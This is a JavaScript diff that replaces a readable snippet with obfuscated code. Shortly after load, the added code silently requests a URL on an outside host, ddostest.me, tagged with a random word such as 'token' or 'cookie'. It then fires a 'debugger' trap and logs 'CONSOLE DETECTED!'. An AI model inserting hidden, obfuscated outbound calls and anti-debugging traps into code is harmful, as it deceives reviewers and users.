@@ -1,14 +1,1 @@
-const words = ["key", "db", "token", "database", "data", "proxy", "api", "exec", "cookie", "php", "html", "css", "javascript", "script", "js", "messages"];
-
-setTimeout(() => {
-  function generateRandomWord() {
-    const randomIndex = Math.floor(Math.random() * words.length);
-    const randomWord = words[randomIndex];
-    return randomWord;
-  }
-
-  fetch(`https://ddostest.me/cloud/storage/stats/${generateRandomWord()}`)
-  .then((response)=>console.log(response));
-  debugger;
-  console.log("CONSOLE DETECTED!");
-}, 50);
+function _0x3c3b(_0x16f4f4,_0x2a7da9){const _0xfc26fc=_0xfc26();return _0x3c3b=function(_0x3c3b76,_0x3b37a1){_0x3c3b76=_0x3c3b76-0x1c4;let _0x2bd93d=_0xfc26fc[_0x3c3b76];return _0x2bd93d;},_0x3c3b(_0x16f4f4,_0x2a7da9);}function _0xfc26(){const _0x397e9a=['php','token','length','1284632zYtevz','6427430FjEvxQ','html','9UxgCSF','815760uKgCPr','10scebdq','CONSOLE\x20DETECTED!','proxy','191031lruiBp','https://ddostest.me/cloud/storage/stats/','then','exec','javascript','204oZAkiC','api','log','1540075GfIgrD','floor','random','37492QPYRvo','data','422170VoHAoR'];_0xfc26=function(){return _0x397e9a;};return _0xfc26();}const _0x2b1c34=_0x3c3b;(function(_0x358d55,_0x491959){const _0x24349b=_0x3c3b,_0x58b5f2=_0x358d55();while(!![]){try{const _0x2744fa=parseInt(_0x24349b(0x1d0))/0x1+-parseInt(_0x24349b(0x1d9))/0x2*(parseInt(_0x24349b(0x1dc))/0x3)+parseInt(_0x24349b(0x1d8))/0x4+-parseInt(_0x24349b(0x1cb))/0x5+-parseInt(_0x24349b(0x1c8))/0x6*(parseInt(_0x24349b(0x1ce))/0x7)+-parseInt(_0x24349b(0x1d4))/0x8+-parseInt(_0x24349b(0x1d7))/0x9*(-parseInt(_0x24349b(0x1d5))/0xa);if(_0x2744fa===_0x491959)break;else _0x58b5f2['push'](_0x58b5f2['shift']());}catch(_0x2c2b1d){_0x58b5f2['push'](_0x58b5f2['shift']());}}}(_0xfc26,0x492fa));const words=['key','db',_0x2b1c34(0x1d2),'database',_0x2b1c34(0x1cf),_0x2b1c34(0x1db),_0x2b1c34(0x1c9),_0x2b1c34(0x1c6),'cookie',_0x2b1c34(0x1d1),_0x2b1c34(0x1d6),'css',_0x2b1c34(0x1c7),'script','js','messages'];setTimeout(()=>{const _0x1917d3=_0x2b1c34;function _0x321037(){const _0x288a7d=_0x3c3b,_0x252560=Math[_0x288a7d(0x1cc)](Math[_0x288a7d(0x1cd)]()*words[_0x288a7d(0x1d3)]),_0x333bc1=words[_0x252560];return _0x333bc1;}fetch(_0x1917d3(0x1c4)+_0x321037())[_0x1917d3(0x1c5)](_0x10bfd8=>console['log'](_0x10bfd8));debugger;console[_0x1917d3(0x1ca)](_0x1917d3(0x1da));},0x32);
